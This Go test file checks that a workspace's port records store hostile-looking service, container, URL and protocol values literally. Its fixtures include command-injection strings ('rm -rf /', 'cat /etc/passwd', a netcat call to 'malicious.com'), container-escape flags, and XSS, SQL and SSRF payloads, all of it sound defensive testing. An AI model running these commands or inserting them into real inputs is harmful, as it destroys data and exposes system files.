// internal/workspace/morph_ports_security_test.go
package workspace

import (
	"encoding/json"
	"strings"
	"testing"
)

// TestPortSecurityInjectionInService tests potential injection in service names
func TestPortSecurityInjectionInService(t *testing.T) {
	testCases := []struct {
		name    string
		service string
	}{
		{"shell_injection", "$(whoami)"},
		{"shell_backtick", "`whoami`"},
		{"command_chain", "svc; rm -rf /"},
		{"command_pipe", "svc | cat /etc/passwd"},
		{"null_byte", "svc\x00malicious"},
		{"newline", "svc\nmalicious"},
		{"carriage_return", "svc\r\nmalicious"},
		{"html_script", "<script>alert('xss')</script>"},
		{"sql_injection", "'; DROP TABLE users; --"},
		{"path_traversal", "../../../etc/passwd"},
		{"env_var", "${PATH}"},
		{"env_var_dollar", "$PATH"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			w := &Workspace{}
			w.AddActivePort(ActivePort{
				Port:    8080,
				Service: tc.service,
			})

			port := w.GetActivePort(8080)
			// Service should be stored as-is (no expansion or execution)
			if port.Service != tc.service {
				t.Errorf("Service should be stored literally: expected %q, got %q", tc.service, port.Service)
			}

			// Verify JSON round-trip preserves the value
			data, err := json.Marshal(w)
			if err != nil {
				t.Fatalf("Marshal failed: %v", err)
			}

			var w2 Workspace
			if err := json.Unmarshal(data, &w2); err != nil {
				t.Fatalf("Unmarshal failed: %v", err)
			}

			port2 := w2.GetActivePort(8080)
			if port2.Service != tc.service {
				t.Errorf("Service after round-trip: expected %q, got %q", tc.service, port2.Service)
			}
		})
	}
}

// TestPortSecurityInjectionInContainer tests potential injection in container names
func TestPortSecurityInjectionInContainer(t *testing.T) {
	testCases := []struct {
		name      string
		container string
	}{
		{"docker_socket", "/var/run/docker.sock"},
		{"privileged_path", "/proc/1/root"},
		{"cgroup_escape", "/sys/fs/cgroup"},
		{"host_network", "--network=host"},
		{"privileged_flag", "--privileged"},
		{"volume_mount", "-v /:/host"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			w := &Workspace{}
			w.AddActivePort(ActivePort{
				Port:      8080,
				Container: tc.container,
			})

			port := w.GetActivePort(8080)
			if port.Container != tc.container {
				t.Errorf("Container should be stored literally: expected %q, got %q", tc.container, port.Container)
			}
		})
	}
}

// TestPortSecurityInjectionInURL tests potential injection in URLs
func TestPortSecurityInjectionInURL(t *testing.T) {
	testCases := []struct {
		name string
		url  string
	}{
		{"javascript_proto", "javascript:alert('xss')"},
		{"data_proto", "data:text/html,<script>alert('xss')</script>"},
		{"file_proto", "file:///etc/passwd"},
		{"ftp_proto", "ftp://malicious.com"},
		{"url_with_creds", "http://user:pass@example.com"},
		{"localhost_bypass", "http://127.0.0.1:8080"},
		{"ipv6_localhost", "http://[::1]:8080"},
		{"decimal_ip", "http://2130706433:8080"}, // 127.0.0.1 as decimal
		{"dns_rebind", "http://evil.com.127.0.0.1.nip.io"},
		{"open_redirect", "http://example.com//evil.com"},
		{"xss_in_path", "http://example.com/<script>"},
		{"null_in_url", "http://example.com/%00malicious"},
		{"unicode_domain", "http://еxample.com"}, // Cyrillic 'e'
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			w := &Workspace{}
			w.AddActivePort(ActivePort{
				Port: 8080,
				URL:  tc.url,
			})

			port := w.GetActivePort(8080)
			if port.URL != tc.url {
				t.Errorf("URL should be stored literally: expected %q, got %q", tc.url, port.URL)
			}
		})
	}
}

// TestPortSecurityInjectionInProtocol tests potential injection in protocol
func TestPortSecurityInjectionInProtocol(t *testing.T) {
	testCases := []string{
		"tcp; cat /etc/passwd",
		"udp && whoami",
		"tcp|nc malicious.com 1234",
		"tcp\nmalicious",
		"tcp\x00udp",
	}

	for i, proto := range testCases {
		t.Run(strings.ReplaceAll(proto[:min(10, len(proto))], "\n", "\\n"), func(t *testing.T) {
			w := &Workspace{}
			w.AddActivePort(ActivePort{
				Port:     8080 + i,
				Protocol: proto,
			})

			port := w.GetActivePort(8080 + i)
			if port.Protocol != proto {
				t.Errorf("Protocol should be stored literally")
			}
		})
	}
}

// TestPortSecurityNegativePort tests negative port numbers
func TestPortSecurityNegativePort(t *testing.T) {
	testCases := []int{-1, -80, -443, -65535, -2147483648}

	for _, p := range testCases {
		t.Run(string(rune('0'-p)), func(t *testing.T) {
			w := &Workspace{}
			w.AddActivePort(ActivePort{Port: p})

			port := w.GetActivePort(p)
			if port == nil {
				t.Errorf("Should be able to retrieve negative port %d", p)
			}
		})
	}
}

// TestPortSecurityOverflowPort tests port overflow values
func TestPortSecurityOverflowPort(t *testing.T) {
	testCases := []int{65536, 100000, 2147483647, -2147483647}

	for _, p := range testCases {
		t.Run("port_overflow", func(t *testing.T) {
			w := &Workspace{}
			w.AddActivePort(ActivePort{Port: p})

			port := w.GetActivePort(p)
			if port == nil {
				t.Errorf("Should be able to retrieve overflow port %d", p)
			}
			if port.Port != p {
				t.Errorf("Port value should be preserved: expected %d, got %d", p, port.Port)
			}
		})
	}
}

// TestPortSecurityLocalPortBoundary tests LocalPort boundary values
func TestPortSecurityLocalPortBoundary(t *testing.T) {
	testCases := []int{0, -1, -65535, 65536, 100000}

	for _, lp := range testCases {
		t.Run("localport_boundary", func(t *testing.T) {
			w := &Workspace{}
			w.AddActivePort(ActivePort{
				Port:      8080,
				LocalPort: lp,
			})

			port := w.GetActivePort(8080)
			if port.LocalPort != lp {
				t.Errorf("LocalPort should be preserved: expected %d, got %d", lp, port.LocalPort)
			}
		})
	}
}

// TestPortSecurityJSONMalformed tests handling of malformed JSON
func TestPortSecurityJSONMalformed(t *testing.T) {
	testCases := []struct {
		name string
		json string
	}{
		{"negative_port", `{"morph":{"active_ports":[{"port":-1}]}}`},
		{"string_port", `{"morph":{"active_ports":[{"port":"8080"}]}}`},
		{"null_port", `{"morph":{"active_ports":[{"port":null}]}}`},
		{"float_port", `{"morph":{"active_ports":[{"port":8080.5}]}}`},
		{"array_port", `{"morph":{"active_ports":[{"port":[8080]}]}}`},
		{"object_port", `{"morph":{"active_ports":[{"port":{"value":8080}}]}}`},
		{"huge_port", `{"morph":{"active_ports":[{"port":999999999999999999999}]}}`},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			var w Workspace
			err := json.Unmarshal([]byte(tc.json), &w)
			// Some may error, some may not - we just want no panics
			t.Logf("%s: error=%v, ports=%d", tc.name, err, len(w.Morph.ActivePorts))
		})
	}
}

// TestPortSecurityDeepNesting tests deeply nested JSON
func TestPortSecurityDeepNesting(t *testing.T) {
	// This shouldn't cause stack overflow
	w := &Workspace{ID: "ws-deep"}
	w.AddActivePort(ActivePort{
		Port:      8080,
		Service:   strings.Repeat("{", 100),
		Container: strings.Repeat("[", 100),
	})

	data, err := json.Marshal(w)
	if err != nil {
		t.Fatalf("Marshal failed: %v", err)
	}

	var w2 Workspace
	if err := json.Unmarshal(data, &w2); err != nil {
		t.Fatalf("Unmarshal failed: %v", err)
	}
}

// TestPortSecurityLargeField tests handling of extremely large field values
func TestPortSecurityLargeField(t *testing.T) {
	w := &Workspace{}

	// 10MB service name
	largeService := strings.Repeat("x", 10*1024*1024)
	w.AddActivePort(ActivePort{
		Port:    8080,
		Service: largeService,
	})

	port := w.GetActivePort(8080)
	if len(port.Service) != 10*1024*1024 {
		t.Errorf("Expected 10MB service, got %d bytes", len(port.Service))
	}
}

// TestPortSecurityUnicodeEdgeCases tests Unicode edge cases
func TestPortSecurityUnicodeEdgeCases(t *testing.T) {
	testCases := []struct {
		name    string
		service string
	}{
		{"null_char", "svc\x00name"},
		{"bom", "\uFEFFservice"},
		{"rtl_override", "\u202Eservice"},
		{"zero_width", "serv\u200Bice"},
		{"replacement_char", "service\uFFFD"},
		{"surrogate_pair", "service\U0001F600"},
		{"combining_chars", "se\u0301rvice"},
		{"private_use", "service\uE000"},
		{"noncharacter", "service\uFFFF"},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			w := &Workspace{}
			w.AddActivePort(ActivePort{
				Port:    8080,
				Service: tc.service,
			})

			port := w.GetActivePort(8080)
			if port.Service != tc.service {
				t.Errorf("Unicode service should be preserved")
			}

			// Test JSON round-trip
			data, err := json.Marshal(w)
			if err != nil {
				t.Fatalf("Marshal failed: %v", err)
			}

			var w2 Workspace
			if err := json.Unmarshal(data, &w2); err != nil {
				t.Fatalf("Unmarshal failed: %v", err)
			}
		})
	}
}

// TestPortSecurityEmptyStrings tests various empty string scenarios
func TestPortSecurityEmptyStrings(t *testing.T) {
	w := &Workspace{}

	// All empty strings
	w.AddActivePort(ActivePort{
		Port:      8080,
		Protocol:  "",
		Service:   "",
		Container: "",
		URL:       "",
	})

	port := w.GetActivePort(8080)
	if port.Protocol != "" || port.Service != "" || port.Container != "" || port.URL != "" {
		t.Error("Empty strings should remain empty")
	}
}

// TestPortSecurityWhitespaceStrings tests whitespace-only strings
func TestPortSecurityWhitespaceStrings(t *testing.T) {
	whitespaces := []string{" ", "  ", "\t", "\n", "\r\n", " \t\n", "   \t\t\t"}

	for i, ws := range whitespaces {
		t.Run("whitespace", func(t *testing.T) {
			w := &Workspace{}
			w.AddActivePort(ActivePort{
				Port:    8080 + i,
				Service: ws,
			})

			port := w.GetActivePort(8080 + i)
			if port.Service != ws {
				t.Errorf("Whitespace should be preserved: expected %q, got %q", ws, port.Service)
			}
		})
	}
}

// TestPortSecurityBooleanEdgeCases tests boolean field edge cases
func TestPortSecurityBooleanEdgeCases(t *testing.T) {
	// Test explicit true/false
	w := &Workspace{}
	w.AddActivePort(ActivePort{Port: 8080, IsHTTP: true})
	w.AddActivePort(ActivePort{Port: 8081, IsHTTP: false})

	port1 := w.GetActivePort(8080)
	port2 := w.GetActivePort(8081)

	if !port1.IsHTTP {
		t.Error("IsHTTP should be true for port 8080")
	}
	if port2.IsHTTP {
		t.Error("IsHTTP should be false for port 8081")
	}
}

// TestPortSecurityJSONBooleanStrings tests JSON with string booleans
func TestPortSecurityJSONBooleanStrings(t *testing.T) {
	testCases := []struct {
		name string
		json string
	}{
		{"string_true", `{"morph":{"active_ports":[{"port":8080,"is_http":"true"}]}}`},
		{"string_false", `{"morph":{"active_ports":[{"port":8080,"is_http":"false"}]}}`},
		{"number_1", `{"morph":{"active_ports":[{"port":8080,"is_http":1}]}}`},
		{"number_0", `{"morph":{"active_ports":[{"port":8080,"is_http":0}]}}`},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			var w Workspace
			err := json.Unmarshal([]byte(tc.json), &w)
			// May or may not error depending on Go's JSON handling
			t.Logf("%s: error=%v", tc.name, err)
		})
	}
}

// TestPortSecurityDuplicatePortsJSON tests JSON with duplicate ports
func TestPortSecurityDuplicatePortsJSON(t *testing.T) {
	jsonData := `{
		"morph": {
			"active_ports": [
				{"port": 8080, "service": "first"},
				{"port": 8080, "service": "second"}
			]
		}
	}`

	var w Workspace
	if err := json.Unmarshal([]byte(jsonData), &w); err != nil {
		t.Fatalf("Unmarshal failed: %v", err)
	}

	// Should have both entries (raw JSON unmarshal doesn't dedupe)
	if len(w.Morph.ActivePorts) != 2 {
		t.Errorf("Expected 2 ports from JSON, got %d", len(w.Morph.ActivePorts))
	}
}

// TestPortSecurityTimeEdgeCases tests timestamp edge cases
func TestPortSecurityTimeEdgeCases(t *testing.T) {
	testCases := []struct {
		name string
		json string
	}{
		{"invalid_time", `{"morph":{"active_ports":[{"port":8080,"discovered_at":"invalid"}]}}`},
		{"zero_time", `{"morph":{"active_ports":[{"port":8080,"discovered_at":"0001-01-01T00:00:00Z"}]}}`},
		{"future_time", `{"morph":{"active_ports":[{"port":8080,"discovered_at":"9999-12-31T23:59:59Z"}]}}`},
		{"negative_year", `{"morph":{"active_ports":[{"port":8080,"discovered_at":"-0001-01-01T00:00:00Z"}]}}`},
	}

	for _, tc := range testCases {
		t.Run(tc.name, func(t *testing.T) {
			var w Workspace
			err := json.Unmarshal([]byte(tc.json), &w)
			t.Logf("%s: error=%v", tc.name, err)
		})
	}
}

